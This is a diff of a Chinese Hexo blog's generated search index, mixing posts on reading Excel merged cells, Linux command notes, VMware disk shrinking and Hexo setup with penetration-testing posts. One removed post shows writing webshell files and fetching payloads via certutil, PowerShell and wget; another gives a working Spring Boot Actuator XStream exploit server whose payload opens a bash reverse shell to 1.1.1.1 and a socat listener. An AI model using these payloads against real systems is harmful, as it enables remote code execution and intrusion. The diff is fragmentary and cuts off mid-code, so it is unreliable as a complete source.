-<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
-<li>Python 3</li>
-<li>xlrd==1.2.0</li>
-</ul>
-<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>xlrd提供了<code>sheet.merged_cells</code>用于获取页面中所有的合并单元格坐标。类似：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>)]</span><br></pre></td></tr></table></figure>
-<a id="more"></a>
-<p>坐标从0开始算起，代表第1行到第4行（不包含4），第0列到第一列（不包含1）为合并单元格。</p>
-<p>这里有一个点要注意，xlrd官方说明中，需要在<code>open_workbook</code>时传入<code>formatting_info=True</code>，如果未设置此选项，获取到的合并单元格坐标为空，这点是很多文章没有提到的，可能是版本的变更问题：<br><img data-src="Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/2020-08-20-19-14-52.png"></p>
-<p>示例代码：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line">wb = xlrd.open_workbook(<span class="string">&#x27;test.xls&#x27;</span>, formatting_info=<span class="literal">True</span>)</span><br><span class="line">sheet = wb.sheet_by_name(<span class="string">&#x27;Sheet1&#x27;</span>)</span><br><span class="line">mc = sheet.merged_cells</span><br><span class="line">print(mc)</span><br></pre></td></tr></table></figure>
-<p>结果输出：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>)]</span><br></pre></td></tr></table></figure>
+    <title>Linux命令备忘</title>
+    <url>/2020/01/03/Linux%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98/</url>
+    <content><![CDATA[<h3 id="Linux命令备忘"><a href="#Linux命令备忘" class="headerlink" title="Linux命令备忘"></a>Linux命令备忘</h3><ol start="0">
+<li>xargs占位符<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> aaa |xargs -I &#123;&#125; python3 test.py &#123;&#125; &#123;&#125;.xlsx</span><br></pre></td></tr></table></figure></li>
+<li>查看进程启动时间<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -eo pid,lstart,etime,cmd | grep nginx</span><br></pre></td></tr></table></figure></li>
+<li>找出大于500m的文件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -size +500M -print0 |xargs -0 ls -l</span><br></pre></td></tr></table></figure></li>
+<li>Debian显示已安装的软件包<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt list --installed</span><br></pre></td></tr></table></figure>
+<a id="more"></a></li>
+<li>批量杀进程<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux |grep hydra |awk <span class="string">&#x27;&#123;printf &quot;%s\n&quot;, $2&#125;&#x27;</span> |xargs <span class="built_in">kill</span> -9</span><br></pre></td></tr></table></figure></li>
+<li>apt-get配置代理<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://192.168.137.1:1080</span><br></pre></td></tr></table></figure></li>
+<li>wget设置代理<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.5.2/Python-3.5.2rc1.tgz -e <span class="string">&#x27;https_proxy=http://192.168.137.1:1080&#x27;</span></span><br></pre></td></tr></table></figure></li>
+<li>Debian设置SSH自启动<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-rc.d  ssh <span class="built_in">enable</span></span><br></pre></td></tr></table></figure></li>
+<li>Kali设置阿里云源<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">修改/etc/apt/sources.list文件为以下内容：</span><br><span class="line">deb https://mirrors.aliyun.com/kali/ kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/kali/ kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure></li>
+<li>查找重复行并统计出现次数，例：统计各IP出现次数 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat ip.txt |grep -E -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][ 0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>  |sort |uniq -c &gt; ipncount.txt</span><br></pre></td></tr></table></figure>
 
-<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> Workbook</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_merged_cells_value</span>(<span class="params">sheet, row_index, col_index</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    判断单元格是否为合并单元格，是则返回合并单元格的值，否则返回None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    merged_cells = sheet.merged_cells</span><br><span class="line">    <span class="keyword">for</span> rlo, rhi, clo, chi <span class="keyword">in</span> merged_cells:</span><br><span class="line">        <span class="comment"># 判断行下标是否在合并单元格范围内</span></span><br><span class="line">        <span class="keyword">if</span> row_index <span class="keyword">in</span> range(rlo, rhi):</span><br><span class="line">            <span class="comment"># 判断列下标是否在合并单元格范围内</span></span><br><span class="line">            <span class="keyword">if</span> col_index <span class="keyword">in</span> range(clo, chi):</span><br><span class="line">                <span class="comment"># 返回单元格值</span></span><br><span class="line">                <span class="keyword">return</span> sheet.cell_value(rlo, clo)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 打开Excel</span></span><br><span class="line">    wb = xlrd.open_workbook(<span class="string">&#x27;test.xls&#x27;</span>, formatting_info=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 指定工作表</span></span><br><span class="line">    sheet = wb.sheet_by_name(<span class="string">&#x27;Sheet2&#x27;</span>)</span><br><span class="line">    <span class="comment"># 获取总行数</span></span><br><span class="line">    rows_num = sheet.nrows</span><br><span class="line">    <span class="comment"># 获取总列数</span></span><br><span class="line">    cols_num = sheet.ncols</span><br><span class="line">    <span class="comment"># 遍历行</span></span><br><span class="line">    <span class="keyword">for</span> ri <span class="keyword">in</span> range(rows_num):</span><br><span class="line">        row = sheet.row_values(ri)</span><br><span class="line">        <span class="comment"># 遍历列</span></span><br><span class="line">        <span class="keyword">for</span> ci <span class="keyword">in</span> range(cols_num):</span><br><span class="line">            <span class="comment"># 获取合并单元格值，不是合并单元格的返回None</span></span><br><span class="line">            merged_cell_value = get_merged_cells_value(sheet, ri, ci)</span><br><span class="line">            <span class="comment"># 判断单元格是否在合并单元格清单中，是的话则返回正确的单元格值</span></span><br><span class="line">            <span class="keyword">if</span> merged_cell_value:</span><br><span class="line">                <span class="comment"># 修改行中合并单元格值为正确值</span></span><br><span class="line">                row[ci] = merged_cell_value</span><br><span class="line">        <span class="comment"># 打印列结果</span></span><br><span class="line">        print(row)</span><br><span class="line">        <span class="comment"># 后面的根据实际需要进行加工</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 
-<h3 id="结果输出"><a href="#结果输出" class="headerlink" title="结果输出"></a>结果输出</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;列1&#x27;</span>, <span class="string">&#x27;列2&#x27;</span>, <span class="string">&#x27;列3&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">1.0</span>, <span class="number">4.0</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">2.0</span>, <span class="number">5.0</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">3.0</span>, <span class="number">6.0</span>]</span><br></pre></td></tr></table></figure>
 
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xlrd.readthedocs.io/en/latest/api.html?highlight=merged_cells#xlrd.sheet.Sheet.merged_cells">xlrd官方文档</a><br><a href="https://www.jianshu.com/p/24a693fff4a3">python3读取Excel(包含合并单元格)</a></p>
-]]></content>
+
+</li>
+</ol>
+<h3 id="本文持续更新"><a href="#本文持续更新" class="headerlink" title="本文持续更新"></a>本文持续更新</h3>]]></content>
       <categories>
-        <category>Python</category>
+        <category>Linux</category>
       </categories>
       <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SHELL写文件的几种方式</title>
-    <url>/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
-    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文总结了一些通过<code>cmd</code>或者<code>bash</code>等<code>shell</code>写文件的方法，如在某些情况下，拿到了<code>cmd shell</code>或者<code>bash shell</code>，如下图：<br><img data-src="SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-00-21.png"></p>
-<p>但是靶机无法上公网和反连攻击机，然后通过<code>echo</code>等方式写<code>shell</code>的方法。受限于本人有限的知识面以及实用性等考量，这里列出的方法并不全面，仅供参考。</p>
-<a id="more"></a>
-<h3 id="Windows-下写文件"><a href="#Windows-下写文件" class="headerlink" title="Windows 下写文件"></a>Windows 下写文件</h3><h4 id="echo写文件"><a href="#echo写文件" class="headerlink" title="echo写文件"></a>echo写文件</h4><p>这是最原始的方法，比较折腾人。如果你以为只要<code>echo 1 &gt; 1.txt</code>这样写入，就图样了。Windows下的<code>cmd echo</code>写入需要特殊字符转义，如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt; --- ^&lt;</span><br><span class="line">&gt; --- ^&gt;</span><br><span class="line">/ --- ^/</span><br><span class="line">+ --- ^+</span><br></pre></td></tr></table></figure>
-<p>另外，由于web服务器自动转码<code>URL编码</code>，把原本不是URL编码的字符转码了，导致写入的文件错误，所以还需对下面的字符转码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">% --&gt; %25    # --&gt; %23    @ --&gt; %40</span><br><span class="line">+ --&gt; %2b    | --&gt; %7c    &amp; --&gt; ^%26</span><br></pre></td></tr></table></figure>
-<p><code>冰蝎</code>马使用这种方法转码的效果如下：<br><img data-src="SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-02-27.png"><br>然后通过<code>echo &lt;转码后的payload&gt; &gt; path/xxx.ext</code>写入文件，示例如下：<br><img data-src="SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-02-56.png"><br>局限性：</p>
-<ul>
-<li><p>Echo 字符数量有限，依赖于具体的浏览器也依赖于 web 服务器，当然还有万恶的 IDS。</p>
-</li>
-<li><p>IE 在地址栏的字符数上限是 2048 个字符</p>
-</li>
-<li><p>Chrome 没有明显的上限, 超过 1M 的内容也可以轻松接受</p>
-</li>
-<li><p>Firefox 没有明显的上限, 超过 5M 的内容也可以轻松接受</p>
-</li>
-<li><p>LinuxWin tomcat jboss 接受的 URL 最大长度是 7800</p>
-</li>
-<li><p>Windows Tomcat URL7825</p>
-</li>
-<li><p>Windows PHP Apache URL 最大长度为 8193<br>IIS6 ASP URL 最大长度为 15973</p>
-</li>
-</ul>
-<h4 id="certutil-base64解码写入"><a href="#certutil-base64解码写入" class="headerlink" title="certutil base64解码写入"></a>certutil base64解码写入</h4><p>上面提到<code>echo</code>写入万恶的转义问题，那么，通过base64编码是不是可以解决这烦人的转义问题呢？是的！<br>比如，我们要把<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>（base64编码为：<code>PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</code>）写入文件，可用如下方法：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== &gt; 1.txt</span><br><span class="line">certutil.exe -decode 1.txt 2.jsp</span><br></pre></td></tr></table></figure>
-<p>这时候<code>2.jsp</code>就是要写入的内容：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat 2.jsp</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>顺带一提，<code>certutil</code>下载文件的方法：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f &lt;url&gt;</span><br><span class="line">示例：</span><br><span class="line">certutil.exe -urlcache -split -f http://192.168.245.130:8080/1.txt</span><br><span class="line">或者：</span><br><span class="line">certutil.exe -urlcache -split -f http://192.168.245.130:8080/1.txt 2.txt</span><br></pre></td></tr></table></figure>
-<p>不幸的是，<strong>即使下载的不是有毒文件，杀软还是很可能会杀掉：</strong><br><img data-src="SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-05-57.png"><br><img data-src="SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-06-02.png"></p>
-<h4 id="powershell-base64写入"><a href="#powershell-base64写入" class="headerlink" title="powershell base64写入"></a>powershell base64写入</h4><p><code>powershell</code>写入的方法就简单得多，如下：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#x27;</span></span><br><span class="line">[<span class="type">System.Text.Encoding</span>]::ASCII.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$data</span>))</span><br></pre></td></tr></table></figure>
-<p>效果如下，在后面加上重定向符即可写入文件:<br><img data-src="SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-06-50.png"></p>
-<h4 id="powershell下载文件"><a href="#powershell下载文件" class="headerlink" title="powershell下载文件"></a>powershell下载文件</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">打印远程文件到控制台：  </span><br><span class="line">(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.245.130:8080/1.txt&#x27;</span>)</span><br><span class="line">或者：</span><br><span class="line">powershell <span class="literal">-c</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.245.130:8080/1.txt&#x27;</span>)</span><br><span class="line">直接下载文件：  </span><br><span class="line">(<span class="built_in">New-Object</span> Net.WebClient).DownloadFileAsync(<span class="string">&#x27;http://192.168.245.130:8080/1.txt&#x27;</span>, <span class="string">&#x27;1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p><img data-src="SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-07-43.png"></p>
-<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>因为Linux一般都自带base64命令，这里就不讨论转义的问题了。</p>
-<h4 id="bash-base64写入"><a href="#bash-base64写入" class="headerlink" title="bash base64写入"></a>bash base64写入</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== |base64 -d &gt; 1.txt</span><br></pre></td></tr></table></figure>
-
-<h4 id="wget-下载"><a href="#wget-下载" class="headerlink" title="wget 下载"></a>wget 下载</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.245.130:8080/1.txt -O 1.jsp</span><br></pre></td></tr></table></figure>
-
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://rinige.com/index.php/archives/794/">CMD SHELL ECHO 写文件</a><br><a href="https://codeday.me/bug/20190305/738026.html">用powershell解码base64</a></p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -309,13 +309,13 @@
 <h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p>访问web应用的<code>/actuator/env</code>或<code>/env</code>，如果有返回json格式的数据则可能存在漏洞。</p>
 <h3 id="漏洞exp"><a href="#漏洞exp" class="headerlink" title="漏洞exp"></a>漏洞exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, defaults=&#123;&#x27;path&#x27;: &#x27;&#x27;&#125;)</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/&lt;path:path&gt;&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_all</span>(<span class="params">path</span>):</span></span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;linked-hash-set&gt;</span></span><br><span class="line"><span class="string">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;dataHandler&gt;</span></span><br><span class="line"><span class="string">        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span></span><br><span class="line"><span class="string">              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span></span><br><span class="line"><span class="string">                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;command&gt;</span></span><br><span class="line"><span class="string">                    &lt;string&gt;bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">                      &lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">                      &lt;string&gt;bash -i &gt;/dev/tcp/1.1.1.1/50101 0&gt;&amp;amp;1&lt;/string&gt;</span></span><br><span class="line"><span class="string">                    &lt;/command&gt;</span></span><br><span class="line"><span class="string">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span></span><br><span class="line"><span class="string">                  &lt;/next&gt;</span></span><br><span class="line"><span class="string">                &lt;/iter&gt;</span></span><br><span class="line"><span class="string">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;method&gt;</span></span><br><span class="line"><span class="string">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span></span><br><span class="line"><span class="string">                    &lt;name&gt;start&lt;/name&gt;</span></span><br><span class="line"><span class="string">                    &lt;parameter-types/&gt;</span></span><br><span class="line"><span class="string">                  &lt;/method&gt;</span></span><br><span class="line"><span class="string">                  &lt;name&gt;foo&lt;/name&gt;</span></span><br><span class="line"><span class="string">                &lt;/filter&gt;</span></span><br><span class="line"><span class="string">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span></span><br><span class="line"><span class="string">              &lt;/serviceIterator&gt;</span></span><br><span class="line"><span class="string">              &lt;lock/&gt;</span></span><br><span class="line"><span class="string">            &lt;/cipher&gt;</span></span><br><span class="line"><span class="string">            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span></span><br><span class="line"><span class="string">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span></span><br><span class="line"><span class="string">          &lt;/is&gt;</span></span><br><span class="line"><span class="string">        &lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">      &lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">    &lt;/value&gt;</span></span><br><span class="line"><span class="string">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">50102</span>)</span><br></pre></td></tr></table></figure>
 
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先把exp报错为<code>exp.py</code>文件，然后修改第22行的ip地址为接收反弹shell的ip，然后运行<code>exp.py</code>：<br><img data-src="Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-43-34.png"></p>
-<p>配置<code>eureka.client.serviceUrl.defaultZone=http://1.1.1.1:50102/xstream</code>，其中的ip地址为<code>exp.py</code>监听的地址：<br><img data-src="Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-45-25.png"></p>
-<p>然后通过<code>refresh</code>端点刷新，靶机将通过刚刚在<code>env</code>配置的<code>eureka.client.serviceUrl.defaultZone</code>路径发起请求，获取恶意XML文件：<br><img data-src="Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-48-27.png"></p>
-<p><code>exp.py</code>接收到靶机发起的请求：<br><img data-src="Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-49-49.png"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先把exp报错为<code>exp.py</code>文件，然后修改第22行的ip地址为接收反弹shell的ip，然后运行<code>exp.py</code>：<br><img data-src="2020-08-20-19-43-34.png"></p>
+<p>配置<code>eureka.client.serviceUrl.defaultZone=http://1.1.1.1:50102/xstream</code>，其中的ip地址为<code>exp.py</code>监听的地址：<br><img data-src="2020-08-20-19-45-25.png"></p>
+<p>然后通过<code>refresh</code>端点刷新，靶机将通过刚刚在<code>env</code>配置的<code>eureka.client.serviceUrl.defaultZone</code>路径发起请求，获取恶意XML文件：<br><img data-src="2020-08-20-19-48-27.png"></p>
+<p><code>exp.py</code>接收到靶机发起的请求：<br><img data-src="2020-08-20-19-49-49.png"></p>
 <p>获得反弹shell：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat tcp<span class="_">-l</span>:50101,fork,reuseaddr -</span><br></pre></td></tr></table></figure>
-<p><img data-src="Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/2020-08-20-19-50-54.png"></p>
+<p><img data-src="2020-08-20-19-50-54.png"></p>
 <p><strong>注意：</strong> <code>http://1.1.1.1:50102/xstream</code>返回的是<code>application/xml</code>格式数据，否则服务端不认，所以需要运行<code>exp.py</code>来做服务。</p>
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/news/193509.html">Springboot之actuator配置不当的漏洞利用</a><br><a href="https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Spring Boot Actuators配置不当导致RCE漏洞复现</a></p>
 ]]></content>
@@ -331,11 +331,11 @@
     <url>/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/</url>
     <content><![CDATA[<p>可以使用VMware官方的vmware tools进行压缩。<br>压缩前需要删除虚拟机的快照、链接克隆等，然后在虚拟机中执行：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vmware-toolbox-cmd disk shrink /</span><br></pre></td></tr></table></figure>
-<p>执行后等待进度条结束即可：<br><img data-src="VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-08.png"></p>
+<p>执行后等待进度条结束即可：<br><img data-src="2020-08-19-18-33-08.png"></p>
 <a id="more"></a>
 
-<p>压缩前忘了截图了，删除快照等后大概占用33G，实际虚拟机硬盘使用：<br><img data-src="VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-34.png"></p>
-<p>压缩后占用：<br><img data-src="VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-47.png"></p>
+<p>压缩前忘了截图了，删除快照等后大概占用33G，实际虚拟机硬盘使用：<br><img data-src="2020-08-19-18-33-34.png"></p>
+<p>压缩后占用：<br><img data-src="2020-08-19-18-33-47.png"></p>
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.modb.pro/db/13321">VMware 虚拟机磁盘占用过大怎么办？</a></p>
 ]]></content>
       <categories>
@@ -384,16 +384,16 @@
 <p>然后在next主题的——config.yml下面填入url：</p>
 <figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="comment"># Replace the default image and set the url here.</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/avatar.jpg</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="本地图片引用"><a href="#本地图片引用" class="headerlink" title="本地图片引用"></a>本地图片引用</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>
+<h3 id="本地图片引用"><a href="#本地图片引用" class="headerlink" title="本地图片引用"></a>本地图片引用</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/7ym0n/hexo-asset-image --save</span><br></pre></td></tr></table></figure>
 <p>安装成功后，需要在根路径的_config.yml如下配置</p>
 <figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-<p>这样新建的文章会同时自动生成同文章名的文件夹</p>
-<p>平时我使用<code>vs code</code>写<code>markdown</code>文档，配合<code>Paste Image</code>插件，只需<code>Ctrl + Alt + V</code>可自动把剪切板的图片复制到同路径的<code>images</code>文件夹下，并在文章中生成图片链接。因hexo只能读取文章同路径下同文章名的文件夹下的文件，需要把<code>images</code>文件夹的所有图片复制到同文章名的文件夹下，然后在文章中把所有<code>images</code>替换成同文章名即可</p>
-<p>注意：<br>新版hexo跟hexo-asset-image插件不兼容了，需要修改<code>blog\node_modules\hexo-asset-image</code>目录下的<code>index.js</code>文件为如下：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> cheerio = <span class="built_in">require</span>(<span class="string">&#x27;cheerio&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPosition</span>(<span class="params">str, m, i</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.split(m, i).join(m).length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hexo.extend.filter.register(<span class="string">&#x27;after_post_render&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> config = hexo.config;</span><br><span class="line">  <span class="keyword">if</span>(config.post_asset_folder)&#123;</span><br><span class="line">    <span class="keyword">var</span> link = data.permalink;</span><br><span class="line">    <span class="keyword">var</span> beginPos = getPosition(link, <span class="string">&#x27;/&#x27;</span>, <span class="number">3</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> appendLink = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span 